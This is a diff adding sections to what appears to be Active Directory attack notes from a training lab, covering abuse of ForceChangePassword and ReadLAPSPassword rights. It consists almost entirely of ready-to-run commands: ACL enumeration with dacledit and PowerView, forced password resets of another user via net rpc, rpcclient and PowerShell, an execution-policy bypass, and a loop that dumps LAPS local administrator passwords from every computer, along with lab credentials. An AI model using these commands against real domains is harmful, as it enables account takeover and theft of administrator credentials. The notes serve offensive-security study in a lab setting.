@@ -63,3 +63,86 @@ Import-module .\powerview.ps1
 
 Add-DomainGroupMember -Identity "Backup Operators" -Members pedro -Verbose
 ```
+
+## Password Abuse
+### ForceChangePassword
+- GenericAll, AllExtendedRights, User-Force-Change-Password
+
+#### Enueration
+```bash
+python3 examples/dacledit.py -principal pedro -target yolanda -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
+```
+```powershell
+Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+
+Import-Module .\PowerView.ps1
+
+$userSID = (Get-DomainUser -Identity pedro).objectsid
+
+Get-DomainObjectAcl -Identity yolanda | ?{$_.SecurityIdentifier -eq $userSID}
+
+Get-DomainObjectAcl -Identity yolanda -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
+```
+
+#### Abusing
+```bash
+net rpc password yolanda Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
+```
+```
+rpcclient -U INLANEFREIGHT/pedro%SecuringAD01 10.129.205.81
+
+rpcclient $> setuserinfo2 yolanda 23 Mynewpassword2
+```
+```powershell
+import-module .\powerview.ps1
+
+Set-DomainUserPassword -Identity yolanda -AccountPassword $((ConvertTo-SecureString 'NewpasswordfromW1' -AsPlainText -Force)) -Verbose
+```
+```powershell
+Import-Module ActiveDirectory
+
+Set-ADAccountPassword yolanda -NewPassword $((ConvertTo-SecureString 'NewpasswordfromW2' -AsPlainText -Force)) -Reset -Verbose
+```
+
+### ReadLAPSPassword
+- GenericAll
+- AllExtendedRights
+- ReadProperty
+- ms-Mcs-AdmPwd
+
+#### Enumerating
+```bash
+python3 examples/dacledit.py -principal 'LAPS READERS' -target 'laps09$' -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
+```
+```powershell
+import-module .\powerview.ps1
+
+$group = Get-DomainGroup -Identity "LAPS Readers"
+
+Get-DomainObjectAcl -Identity LAPS09 -ResolveGUIDs  |?{$_.SecurityIdentifier -eq $group.objectsid}
+```
+
+#### Abusing
+```powershell
+Import-Module .\PowerView.ps1
+
+Get-DomainObject -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name
+
+Get-DomainComputer -Properties name | ForEach-Object {
+    $computer = $_.name
+    $obj = Get-DomainObject -Identity $computer -Properties "ms-mcs-AdmPwd",name -ErrorAction SilentlyContinue
+    if($obj.'ms-mcs-AdmPwd'){
+        Write-Output "$computer`: $($obj.'ms-mcs-AdmPwd')"
+    }
+}
+```
+```powershell
+Import-Module ActiveDirectory
+
+Get-ADComputer -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name
+```
+```bash
+python3 laps.py -u rita -p Password123 -l 10.129.205.81 -d inlanefreight.local
+```
+
+### ReadGMSAPassword
